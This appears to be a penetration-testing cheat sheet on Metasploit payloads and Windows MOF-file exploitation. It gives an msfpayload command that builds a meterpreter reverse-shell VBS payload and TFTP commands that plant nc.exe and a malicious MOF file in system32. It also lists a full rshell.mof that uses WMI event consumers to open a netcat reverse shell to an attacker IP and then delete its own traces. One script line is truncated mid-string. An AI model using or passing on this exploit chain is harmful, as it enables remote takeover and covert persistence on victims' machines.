# **MSFVenom & Metasploit**

[http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)  
msfpayload windows/meterpreter/reverse_tcp LHOST=<ip> R | msfencode -e generic/none -t vbs  
/windows/system32/eula.txt store it's version in eula.txt  
Works on XP SP3 only  
tftp x.x.x.x  
>mode binary  
>put nc.exe windows/system32/nc.exe  
>put rshell.mof windows/system32/wbem/mof/rshell.mof  
>cd DOCUM~1  
cd  
  
rshell.mof  
------------------------------------------  
class MyClasshack  
{  
[key] string Name;  
};  
class ActiveScriptEventConsumer : __EventConsumer  
{  
[key] string Name;  
[not_null] string ScriptingEngine;  
string ScriptFileName;  
[template] string ScriptText;  
uint32 KillTimeout;  
};  
instance of __Win32Provider as $P  
{  
Name = "ActiveScriptEventConsumer";  
CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";  
PerUserInitialization = TRUE;  
};  
instance of __EventConsumerProviderRegistration  
{  
Provider = $P;  
ConsumerClassNames = {"ActiveScriptEventConsumer"};  
};  
Instance of ActiveScriptEventConsumer as $cons  
{  
Name = "ASEC";  
ScriptingEngine = "JScript";  
ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"nc -e cmd x.x.x.x  
};  
Instance of ActiveScriptEventConsumer as $cons2  
{  
Name = "qndASEC";  
ScriptingEngine = "JScript";  
ScriptText = "\nvar objfs = new ActiveXObject(\"Scripting.FileSystemObject\");\ntry {var f1 = objfs.GetFile(\"wbem\\\\mof\\\\good\\\\hack.mof\");\nf1.Delete(true);} catch(err) {};\ntry {\nvar f2 = objfs.GetFile(\"hack.exe\");\nf2.Delete(true);\nvar s = GetObject(\"winmgmts:root\\\\cimv2\");s.Delete(\"__EventFilter.Name='qndfilt'\");s.Delete(\"ActiveScriptEventConsumer.Name='qndASEC'\");\n} catch(err) {};";  
};  
instance of __EventFilter as $Filt  
{  
Name = "instfilt";  
Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyClasshack\"";  
QueryLanguage = "WQL";  
};  
instance of __EventFilter as $Filt2  
{  
Name = "qndfilt";  
Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"nc.exe\"";  
QueryLanguage = "WQL";  
};  
instance of __FilterToConsumerBinding as $bind  
{  
Consumer = $cons;  
Filter = $Filt;  
};  
instance of __FilterToConsumerBinding as $bind2  
{  
Consumer = $cons2;  
Filter = $Filt2;  
};  
instance of MyClasshack as $MyClass  
{  
Name = "ClassConsumer";  
};  
  
------------------------------------------------------------------------